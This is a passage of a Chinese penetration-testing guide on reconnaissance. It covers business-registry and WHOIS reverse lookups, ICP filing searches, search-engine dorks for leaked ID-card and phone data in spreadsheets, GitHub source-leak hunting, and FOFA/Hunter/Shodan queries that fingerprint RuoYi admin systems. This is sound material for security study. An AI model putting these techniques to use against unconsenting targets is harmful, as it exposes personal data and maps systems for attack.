<p><a href="https://forum.butian.net/share/2841#3371-1608955824768" target="_blank" rel="noopener noreferrer">3.4、信息泄漏</a></p>
<p><a href="https://forum.butian.net/share/2841#4490-1608955824768" target="_blank" rel="noopener noreferrer">3.5、网络空间搜索引擎</a></p>
<p><a href="https://forum.butian.net/share/2841#5540-1609152256957" target="_blank" rel="noopener noreferrer">3.6、利用SSL证书查询</a></p>
<p><a href="https://forum.butian.net/share/2841#2123-1609152256957" target="_blank" rel="noopener noreferrer">3.7、国外访问</a></p>
<p><a href="https://forum.butian.net/share/2841#5089-1609152158354" target="_blank" rel="noopener noreferrer">3.8、LTM解码法</a></p>
<p><a href="https://forum.butian.net/share/2841#2181-1608955668851" target="_blank" rel="noopener noreferrer">五、基本目录、敏感目录及文件</a></p>
<p><a href="https://forum.butian.net/share/2841#4679-1608992618890" target="_blank" rel="noopener noreferrer">1、dirsearch</a></p>
<p><a href="https://forum.butian.net/share/2841#3231-1608992732589" target="_blank" rel="noopener noreferrer">2、dirbuster</a></p>
<p><a href="https://forum.butian.net/share/2841#3622-1608992805474" target="_blank" rel="noopener noreferrer">3、7kbscan</a></p>
<p><a href="https://forum.butian.net/share/2841#6361-1608920351807" target="_blank" rel="noopener noreferrer">4、Webrobot</a></p>
<p><a href="https://forum.butian.net/share/2841#4220-1609573008653" target="_blank" rel="noopener noreferrer">5、御剑</a></p>
<p><a href="https://forum.butian.net/share/2841#6791-1609573020093" target="_blank" rel="noopener noreferrer">6、爬虫-中国菜刀</a></p>
<p><a href="https://forum.butian.net/share/2841#9124-1609600023020" target="_blank" rel="noopener noreferrer">7、wwwscan</a></p>
<p><a href="https://forum.butian.net/share/2841#3046-1609600030284" target="_blank" rel="noopener noreferrer">8、cansina</a></p>
<p><a href="https://forum.butian.net/share/2841#8653-1609601106194" target="_blank" rel="noopener noreferrer">9、dirmap</a></p>
<p><a href="https://forum.butian.net/share/2841#6077-1609601148943" target="_blank" rel="noopener noreferrer">10、Webdirscan</a></p>
<p><a href="https://forum.butian.net/share/2841#0095-1609601728882" target="_blank" rel="noopener noreferrer">11、BBscan</a></p>
<p><a href="https://forum.butian.net/share/2841#4978-1609601754493" target="_blank" rel="noopener noreferrer">12、GSIL</a></p>
<p><a href="https://forum.butian.net/share/2841#6626-1608993192550" target="_blank" rel="noopener noreferrer">六、端口扫描</a></p>
<p><a href="https://forum.butian.net/share/2841#6069-1608954466298" target="_blank" rel="noopener noreferrer">1、各服务开启的默认端口以及攻击方向</a></p>
<p><a href="https://forum.butian.net/share/2841#6091-1609151143006" target="_blank" rel="noopener noreferrer">2、在线查询网站</a></p>
<p><a href="https://forum.butian.net/share/2841#5019-1609133130279" target="_blank" rel="noopener noreferrer">3、端口扫描工具</a></p>
<p><a href="https://forum.butian.net/share/2841#4561-1609133361937" target="_blank" rel="noopener noreferrer">3.1、nmap(zmap)</a></p>
<p><a href="https://forum.butian.net/share/2841#8017-1609133362312" target="_blank" rel="noopener noreferrer">3.2、masscan</a></p>
<p><a href="https://forum.butian.net/share/2841#8422-1609133130279" target="_blank" rel="noopener noreferrer">3.3、ScanPort</a></p>
<p><a href="https://forum.butian.net/share/2841#9722-1609133130279" target="_blank" rel="noopener noreferrer">3.4、webrobot</a></p>
<p><a href="https://forum.butian.net/share/2841#4097-1608920351807" target="_blank" rel="noopener noreferrer">七、旁站C段</a></p>
<p><a href="https://forum.butian.net/share/2841#3070-1608956426469" target="_blank" rel="noopener noreferrer">1、在线查询</a></p>
<p><a href="https://forum.butian.net/share/2841#9200-1609149932774" target="_blank" rel="noopener noreferrer">1.1、站点</a></p>
<p><a href="https://forum.butian.net/share/2841#6165-1608956426469" target="_blank" rel="noopener noreferrer">1.2、Google Hacking、Bing</a></p>
<p><a href="https://forum.butian.net/share/2841#2668-1609150042919" target="_blank" rel="noopener noreferrer">1.2、网络空间搜索引擎</a></p>
<p><a href="https://forum.butian.net/share/2841#5171-1609149771387" target="_blank" rel="noopener noreferrer">2、探测工具</a></p>
<p><a href="https://forum.butian.net/share/2841#2224-1609149800718" target="_blank" rel="noopener noreferrer">2.1、K8Cscan</a></p>
<p><a href="https://forum.butian.net/share/2841#8618-1609149771812" target="_blank" rel="noopener noreferrer">2.2、nmap、masscan</a></p>
<p><a href="https://forum.butian.net/share/2841#1900-1609149844914" target="_blank" rel="noopener noreferrer">2.3、goby</a></p>
<p><a href="https://forum.butian.net/share/2841#6861-1609149994044" target="_blank" rel="noopener noreferrer">2.4、御剑</a></p>
<p><a href="https://forum.butian.net/share/2841#5389-1609150008457" target="_blank" rel="noopener noreferrer">2.5、北极熊扫描器</a></p>
<p><a href="https://forum.butian.net/share/2841#1349-1609573401484" target="_blank" rel="noopener noreferrer">2.6、通过手动ping</a></p>
<p><a href="https://forum.butian.net/share/2841#1547-1608920351807" target="_blank" rel="noopener noreferrer">八、整站分析</a></p>
<p><a href="https://forum.butian.net/share/2841#5021-1608954477133" target="_blank" rel="noopener noreferrer">1、服务器类型</a></p>
<p><a href="https://forum.butian.net/share/2841#0096-1609320836918" target="_blank" rel="noopener noreferrer">1.1、 云悉WEB资产梳理</a></p>
<p><a href="https://forum.butian.net/share/2841#7810-1609320832121" target="_blank" rel="noopener noreferrer">2、网站容器</a></p>
<p><a href="https://forum.butian.net/share/2841#2839-1609320737099" target="_blank" rel="noopener noreferrer">2.1、火狐渗透测试浏览器</a></p>
<p><a href="https://forum.butian.net/share/2841#2075-1609320737099" target="_blank" rel="noopener noreferrer">2.2、云悉WEB资产梳理</a></p>
<p><a href="https://forum.butian.net/share/2841#9370-1608920351807" target="_blank" rel="noopener noreferrer">3、脚本类型</a></p>
<p><a href="https://forum.butian.net/share/2841#1029-1608920351807" target="_blank" rel="noopener noreferrer">3.1、通过修改首页文件后缀查看页面响应判断</a></p>
<p><a href="https://forum.butian.net/share/2841#9095-1609291086831" target="_blank" rel="noopener noreferrer">3.2、通过搜索框查找相关文章辨别脚本类型</a></p>
<p><a href="https://forum.butian.net/share/2841#3279-1609291086831" target="_blank" rel="noopener noreferrer">3.3、通过爬虫工具爬取网站目录判断网站脚本类型</a></p>
<p><a href="https://forum.butian.net/share/2841#9730-1609291081999" target="_blank" rel="noopener noreferrer">4、CMS类型</a></p>
<p><a href="https://forum.butian.net/share/2841#8518-1608956783838" target="_blank" rel="noopener noreferrer">4.1、云悉指纹</a></p>
<p><a href="https://forum.butian.net/share/2841#8393-1608956783838" target="_blank" rel="noopener noreferrer">4.2、ThreatScan</a></p>
<p><a href="https://forum.butian.net/share/2841#2042-1608956783838" target="_blank" rel="noopener noreferrer">4.3、wappalyzer</a></p>
<p><a href="https://forum.butian.net/share/2841#2217-1608994323598" target="_blank" rel="noopener noreferrer">4.4、WhatWeb</a></p>
<p><a href="https://forum.butian.net/share/2841#1160-1608956783838" target="_blank" rel="noopener noreferrer">4.5、BugScaner</a></p>
<p><a href="https://forum.butian.net/share/2841#3663-1608994632867" target="_blank" rel="noopener noreferrer">4.6、潮汐指纹</a></p>
<p><a href="https://forum.butian.net/share/2841#6783-1608920351807" target="_blank" rel="noopener noreferrer">5、数据库类型</a></p>
<p><a href="https://forum.butian.net/share/2841#5381-1608920351807" target="_blank" rel="noopener noreferrer">6、WAF</a></p>
<p><a href="https://forum.butian.net/share/2841#9127-1609286607208" target="_blank" rel="noopener noreferrer">6.1、在线资产识别</a></p>
<p><a href="https://forum.butian.net/share/2841#9160-1609286607208" target="_blank" rel="noopener noreferrer">6.2、手动检测是拦截页面或者HTTP可识别字段</a></p>
<p><a href="https://forum.butian.net/share/2841#5054-1608956818746" target="_blank" rel="noopener noreferrer">九、后台查找</a></p>
<p>工商数据收集</p>
<p>- 简介</p>
<p>- 工商数据可以帮助测试人员更好地了解目标公司的信息，以便收敛测试的目标范围。</p>
<p>例如，可以通过工商数据获取公司的控股子公司、经营业务、对外发布的产品等信息</p>
<p>这些信息可以帮助我们更准确地识别出目标公司的网络资产，以便对其进行更有效漏洞挖掘</p>
<p>- 工商数据</p>
<p>- 信息来源</p>
<p>- 爱企查</p>
<p>- 企百笪</p>
<p>- 天眼查</p>
<p>- 启信宝</p>
<p>- 小蓝本</p>
<p>- 关注内容</p>
<p>- 企业股权架构</p>
<p>- 网站备案</p>
<p>- 对外公布的产品（小程序、公众号APP、iot设备等）</p>
<p>- 法人电话号、邮箱</p>
<p>- 用处</p>
<ol>
<li>获取控股子公司名称，收集边缘子公司资产</li>
<li>获取备案根域名</li>
<li>获取其他互联网资产</li>
<li>收集用户名等信息</li>
</ol>
<p>- 思路</p>
<p>- 拿到目标公司名之后，先不要着急直接开始收集子域名，先统计好这家公司的股权架构，一般50%控股的可以算作有效目标，子公司资产将为我们提供不少的边缘业务系统</p>
<p>- 通过股权穿透图收集完子公司名称后，网站备案、对外发布的产品、法人电话和邮箱同样也是比较重要的数据</p>
<p>- <em>工具推荐</em></p>
<p>- <a href="https://github.com/wgpsec/ENScan_GO" target="_blank" rel="noopener noreferrer">https://github.com/wgpsec/ENScan_GO</a></p>
<h3 id="站长之家" class="headerLink">
    <a href="#%e7%ab%99%e9%95%bf%e4%b9%8b%e5%ae%b6" class="header-mark"></a>站长之家</h3><p><a href="http://whois.chinaz.com/" target="_blank" rel="noopener noreferrer">http://whois.chinaz.com/</a></p>
<p>利用查询到网站管理员手机号码、姓名、邮箱通过Whois反查查询出网站管理员所注册过的域名，可以对注册的其他域名进行漏洞挖掘。</p>
<p><strong>邮箱反查：<a href="http://whois.chinaz.com/reverse?ddlSearchMode=1" target="_blank" rel="noopener noreferrer">http://whois.chinaz.com/reverse?ddlSearchMode=1</a></strong></p>
<p><strong>注册人反查：<a href="http://whois.chinaz.com/reverse?ddlSearchMode=1" target="_blank" rel="noopener noreferrer">http://whois.chinaz.com/reverse?ddlSearchMode=1</a></strong></p>
<p><strong>电话反查：<a href="http://whois.chinaz.com/reverse?ddlSearchMode=1" target="_blank" rel="noopener noreferrer">http://whois.chinaz.com/reverse?ddlSearchMode=1</a></strong></p>
<h3 id="爱站" class="headerLink">
    <a href="#%e7%88%b1%e7%ab%99" class="header-mark"></a>爱站</h3><p><a href="https://whois.aizhan.com/" target="_blank" rel="noopener noreferrer">https://whois.aizhan.com/</a></p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-6b0c89cb5e9c67a076c770ff866bc4828a637fea.png" title="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-6b0c89cb5e9c67a076c770ff866bc4828a637fea.png" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-6b0c89cb5e9c67a076c770ff866bc4828a637fea.png">
        
    </a></p>
<h3 id="微步" class="headerLink">
    <a href="#%e5%be%ae%e6%ad%a5" class="header-mark"></a>微步</h3><p><a href="https://x.threatbook.cn/" target="_blank" rel="noopener noreferrer">https://x.threatbook.cn/</a></p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-604de8d0d82a771abccecab60d17a4602b3a64e2.png" title="image-20240318211050117" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-604de8d0d82a771abccecab60d17a4602b3a64e2.png">
        
    </a></p>
<h3 id="国外的whois" class="headerLink">
    <a href="#%e5%9b%bd%e5%a4%96%e7%9a%84whois" class="header-mark"></a>国外的who.is</h3><p><a href="https://who.is/" target="_blank" rel="noopener noreferrer">https://who.is/</a></p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-89bff3e05618bd3349d50461833488d162c42dc5.png" title="image-20240318211100783" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-89bff3e05618bd3349d50461833488d162c42dc5.png">
        
    </a></p>
<h3 id="阿里云域名信息查询" class="headerLink">
    <a href="#%e9%98%bf%e9%87%8c%e4%ba%91%e5%9f%9f%e5%90%8d%e4%bf%a1%e6%81%af%e6%9f%a5%e8%af%a2" class="header-mark"></a>阿里云域名信息查询</h3><p><a href="https://whois.aliyun.com/" target="_blank" rel="noopener noreferrer">https://whois.aliyun.com</a></p>
<h3 id="腾讯查询" class="headerLink">
    <a href="#%e8%85%be%e8%ae%af%e6%9f%a5%e8%af%a2" class="header-mark"></a>腾讯查询</h3><p><a href="https://whois.cloud.tencent.com/" target="_blank" rel="noopener noreferrer">https://whois.cloud.tencent.com/</a></p>
<h3 id="中国互联网信息中心" class="headerLink">
    <a href="#%e4%b8%ad%e5%9b%bd%e4%ba%92%e8%81%94%e7%bd%91%e4%bf%a1%e6%81%af%e4%b8%ad%e5%bf%83" class="header-mark"></a>中国互联网信息中心</h3><p><a href="http://ipwhois.cnnic.net.cn/" target="_blank" rel="noopener noreferrer">http://ipwhois.cnnic.net.cn/</a></p>
<h2 id="icpinternet-content-provider备案查询" class="headerLink">
    <a href="#icpinternet-content-provider%e5%a4%87%e6%a1%88%e6%9f%a5%e8%af%a2" class="header-mark"></a>ICP(Internet Content Provider)备案查询</h2><p>可以查询该单位备案的其它网站</p>
<h3 id="国家企业信用信息公示系统" class="headerLink">
    <a href="#%e5%9b%bd%e5%ae%b6%e4%bc%81%e4%b8%9a%e4%bf%a1%e7%94%a8%e4%bf%a1%e6%81%af%e5%85%ac%e7%a4%ba%e7%b3%bb%e7%bb%9f" class="header-mark"></a>国家企业信用信息公示系统</h3><p><a href="http://www.gsxt.gov.cn/index.html" target="_blank" rel="noopener noreferrer">http://www.gsxt.gov.cn/index.html</a></p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-a18add304d0d2c057fa95ced5200752df7b29e1a.png" title="image-20240318211116598" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-a18add304d0d2c057fa95ced5200752df7b29e1a.png">
        
    </a></p>
<h3 id="icp备案查询网" class="headerLink">
    <a href="#icp%e5%a4%87%e6%a1%88%e6%9f%a5%e8%af%a2%e7%bd%91" class="header-mark"></a>ICP备案查询网</h3><p><a href="https://www.beianx.cn/" target="_blank" rel="noopener noreferrer">https://www.beianx.cn/</a></p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-8a7aa2e4b0a4ad3bf8c8723fa4086dae4a67f15e.png" title="image-20240318211229330" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-8a7aa2e4b0a4ad3bf8c8723fa4086dae4a67f15e.png">
        
    </a></p>
<h3 id="icp备案查询---站长工具" class="headerLink">
    <a href="#icp%e5%a4%87%e6%a1%88%e6%9f%a5%e8%af%a2---%e7%ab%99%e9%95%bf%e5%b7%a5%e5%85%b7" class="header-mark"></a>ICP备案查询 - 站长工具</h3><p><a href="http://icp.chinaz.com/" target="_blank" rel="noopener noreferrer">http://icp.chinaz.com/</a></p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-ba334bbd7deb48d316e7e7f11178376c02ac32d8.png" title="image-20240318211245885" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-ba334bbd7deb48d316e7e7f11178376c02ac32d8.png">
        
    </a></p>
<h3 id="天眼查" class="headerLink">
    <a href="#%e5%a4%a9%e7%9c%bc%e6%9f%a5" class="header-mark"></a>天眼查</h3><p><a href="https://www.tianyancha.com/" target="_blank" rel="noopener noreferrer">https://www.tianyancha.com/</a></p>
<p>根据前面获取的企业名称可以获取目标企业的微信公众号、微博、备案站点、APP、软件著作权等信息</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-e3a11a823fd482f821aa2eb5769fe58b7d98e07b.png" title="image-20240318211257183" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-e3a11a823fd482f821aa2eb5769fe58b7d98e07b.png">
        
    </a></p>
<h3 id="企查查" class="headerLink">
    <a href="#%e4%bc%81%e6%9f%a5%e6%9f%a5" class="header-mark"></a>企查查</h3><p><a href="https://www.qcc.com/" target="_blank" rel="noopener noreferrer">https://www.qcc.com/</a></p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-dd5a3a46140714898648d4afb5209e7cb8c5000e.png" title="image-20240318211310422" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-dd5a3a46140714898648d4afb5209e7cb8c5000e.png">
        
    </a></p>
<h2 id="seosearch-engine-optimization查询" class="headerLink">
    <a href="#seosearch-engine-optimization%e6%9f%a5%e8%af%a2" class="header-mark"></a>SEO(Search Engine Optimization)查询</h2><h3 id="爱站-seo综合查询" class="headerLink">
    <a href="#%e7%88%b1%e7%ab%99-seo%e7%bb%bc%e5%90%88%e6%9f%a5%e8%af%a2" class="header-mark"></a>爱站-SEO综合查询</h3><p><a href="https://www.aizhan.com/cha/" target="_blank" rel="noopener noreferrer">https://www.aizhan.com/cha/</a></p>
<p>可以根据域名来收集目标站点的备案信息、名称、注册人等信息<a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-a078b1f77b41bc109b822dead6f72878a4c953d2.png" title="image-20240318211322521" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-a078b1f77b41bc109b822dead6f72878a4c953d2.png">
        
    </a></p>
<h3 id="站长-seo综合查询" class="headerLink">
    <a href="#%e7%ab%99%e9%95%bf-seo%e7%bb%bc%e5%90%88%e6%9f%a5%e8%af%a2" class="header-mark"></a>站长-SEO综合查询</h3><p><a href="http://seo.chinaz.com/" target="_blank" rel="noopener noreferrer">http://seo.chinaz.com/</a></p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-192ff56d8e5ec565530acadd73369738422c9819.png" title="image-20240318211336606" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-192ff56d8e5ec565530acadd73369738422c9819.png">
        
    </a></p>
<h3 id="googlebingbaidu" class="headerLink">
    <a href="#googlebingbaidu" class="header-mark"></a>Google、bing、baidu</h3><p><code>Google</code>需要翻墙，一般用来收集一些敏感信息，用老生常谈的方法</p>
<p>这样收集特定的域名</p>
<p>site:xxx.cn</p>
<p>我通常用来收集特定资产的敏感信息</p>
<p>如 <code>intext:``身份证</code> <code>intext:``电话</code> 再指定后缀 <code>xlsx</code> <code>pdf</code> <code>docs</code>等</p>
<p>另外的时候会收集一些藏的比较深的路由</p>
<p>指定<code>inurl:xxx</code>可能会发现额外的资产</p>
<p>不过相比起<code>Google</code>我更喜欢用<code>Bing</code>，因为不用翻墙</p>
<p>语法的话与<code>Google</code>同理，不过<code>Bing</code>如果用谷歌语法的话搜集的内容会模糊一些，不是精准搜索</p>
<p><a href="https://cn.bing.com/" target="_blank" rel="noopener noreferrer">https://cn.bing.com/</a></p>
<p>最后就是百度，也是搜集信息的一种方式</p>
<p>Ps:``搜索引擎一般用来收集信息泄露和隐藏较深的路由</p>
<p>这里给大家推荐一个网站 (本人也是看别人的知道的【信息收集之-你不知道的骚思路】<a href="https://www.bilibili.com/video/BV1yP4y117Q2?vd_source=6ce69e079d1dd642d7810fbf2e9c817e" target="_blank" rel="noopener noreferrer">https://www.bilibili.com/video/BV1yP4y117Q2?vd_source=6ce69e079d1dd642d7810fbf2e9c817e</a>)</p>
<p>二开谷歌语法&mdash;&mdash;<a href="https://searchtool.drtsrc.com/" target="_blank" rel="noopener noreferrer">https://searchtool.drtsrc.com/</a> (国内版)</p>
<p>-&mdash;&mdash;&mdash;&mdash;&mdash;-<a href="https://dorks.faisalahmed.me/" target="_blank" rel="noopener noreferrer">https://dorks.faisalahmed.me/</a> (国外版)</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-e884f65dc7ebc7a1992994b797c57666c724fdcf.png" title="image-20240318211349607" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-e884f65dc7ebc7a1992994b797c57666c724fdcf.png">
        
    </a></p>
<h2 id="github" class="headerLink">
    <a href="#github" class="header-mark"></a>Github</h2><p>GitHub源码泄露肯定都听说过，但是真正找的源码的案例可能很少，可能是你用的方法有问题，网站域名、网站JS路径、网站备案、网站下的技术支持这些都可以放进去GitHub搜</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-329e15405217eabb9f33e3f97f00690af6f2395b.png" title="image-20240318211404704" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-329e15405217eabb9f33e3f97f00690af6f2395b.png">
        
    </a></p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-2158b74be8703460d50a8f68855da3c47875a609.png" title="image-20240318211411084" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-2158b74be8703460d50a8f68855da3c47875a609.png">
        
    </a></p>
<p>精确搜索：被双引号引起来的部分代表精确匹配</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-3131445766e66dac6b07a75cbf86b194670d2336.png" title="image-20240318211423694" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-3131445766e66dac6b07a75cbf86b194670d2336.png">
        
    </a></p>
<p><strong>Fofa 360</strong> <strong>鹰图 钟馗之眼</strong></p>
<p>鹰图提炼图标很好用</p>
<p>web.icon==&ldquo;4eeb8a8eb30b70af511dcc28c11a3216&rdquo;</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-c5d3c75284a6db7469c0ee707d2c42f55435832e.png" title="image-20240318211439447" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-c5d3c75284a6db7469c0ee707d2c42f55435832e.png">
        
    </a></p>
<p>\=模糊</p>
<p>\==精准</p>
<p>Fofa</p>
<p>icon_hash=&ldquo;174665376&rdquo;</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-95b6f0f1c2fa41fcfef1a1da0ed8e502aa3d1ef2.png" title="image-20240318211452914" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-95b6f0f1c2fa41fcfef1a1da0ed8e502aa3d1ef2.png">
        
    </a></p>
<p>其实，这时候可以发现很多图标，两者是相辅相成的，通过收集图标提炼共性标题，通过收集标题找到共性图标</p>
<p>最好多加个几个精准条件</p>
<p>web.icon==&ldquo;4eeb8a8eb30b70af511dcc28c11a3216&rdquo;&amp;&amp;title=&ldquo;ruoyi&rdquo;</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-67ca4324402cd6f7cf84de1574c0c86d6061076b.png" title="image-20240318211512753" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-67ca4324402cd6f7cf84de1574c0c86d6061076b.png">
        
    </a></p>
<p>`Web``的内容```</p>
<p>body=ruoyi</p>
<p>大家记得多看前端源码</p>
<h3 id="提炼特殊路由" class="headerLink">
    <a href="#%e6%8f%90%e7%82%bc%e7%89%b9%e6%ae%8a%e8%b7%af%e7%94%b1" class="header-mark"></a>提炼特殊路由</h3><p>不同的站点路由其实是不一样的，在这里的话若依站点最特殊的路由是<code>prod-api</code></p>
<p>因此我们从路由的角度来体验</p>
<p>一种是找超链接的提炼方式</p>
<p>body=prod-api/</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-6a523af9532ad5869b4eb9384399e5961d59e822.png" title="image-20240318211634230" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-6a523af9532ad5869b4eb9384399e5961d59e822.png">
        
    </a></p>
<p>可以找到站点中带有若依的超链接路由</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-d8efcb9e369b9753fc23a021fd437501ba970d7d.png" title="image-20240318212159505" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-d8efcb9e369b9753fc23a021fd437501ba970d7d.png">
        
    </a></p>
<p>打开之后我们就可以发现确实超链接指向的是若依的系统</p>
<p>如果收集的若依系统够多，可以发现存在二开的系统有其他的路由，比如<code>admin-api</code> <code>dev-api</code> 等等</p>
<p>另一种方式可能就需要用到搜索引擎去相辅相成的寻找特殊路由</p>
<h3 id="git提炼" class="headerLink">
    <a href="#git%e6%8f%90%e7%82%bc" class="header-mark"></a>GIT提炼</h3><p>很多开源的若依二开可以在<code>github</code>找到相关的项目，往往修改较多的就是默认的<code>prod-api</code>为主，可以按照上面的内容去提炼，这样可以直接收集各个二开若依系统</p>
<h3 id="傻蛋" class="headerLink">
    <a href="#%e5%82%bb%e8%9b%8b" class="header-mark"></a>傻蛋</h3><p>网址：<a href="https://www.shodan.io/" target="_blank" rel="noopener noreferrer">https://www.shodan.io</a></p>
<p>活动：<strong>Shodan*</strong>*黑五1美元一个，淘宝、咸鱼可以看看**</p>
<p>普通：69美元 每月最多 100 万个结果 每月扫描多达 5,120 个 IP 5,120 个 IP 的网络监控</p>
<p>高级：359美元 每月最多 2000 万个结果 每月扫描多达 65,536 个 IP 65,536 个 IP 的网络监控</p>
<p>超级：1099元 每月无限 每月扫描多达 327,680 个 IP 327,680 个 IP 的网络监控</p>
<p>普通与高级功能差别：漏洞搜索过滤器</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-91886143a3662c855eacb265d65427a71892b6a0.png" title="image-20240318212230888" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-91886143a3662c855eacb265d65427a71892b6a0.png">
        
    </a></p>
<h4 id="语法" class="headerLink">
    <a href="#%e8%af%ad%e6%b3%95" class="header-mark"></a>语法</h4><ul>
<li>city：搜索指定城市 例如：<strong>city:“tokyo ”</strong></li>
<li>country：搜索指定国家 例如：<strong>country:“JP”</strong></li>
<li>http.title：搜索指定网站标题 列如：<strong>http.title:“hacked by”</strong></li>
<li>http.html：搜索指定网页类容 例如：<strong>http.html:“hello world”</strong></li>
<li>http.status：搜索指定返回响应码 例如：<strong>http.status:“200”</strong></li>
<li>http.server：搜索指定返回中的server类型 例如：<strong>http.server:“PHP”</strong></li>
<li>net：搜索指定网络范围或 IP段，例如：<strong>net:“8.8.0.0/16”</strong></li>
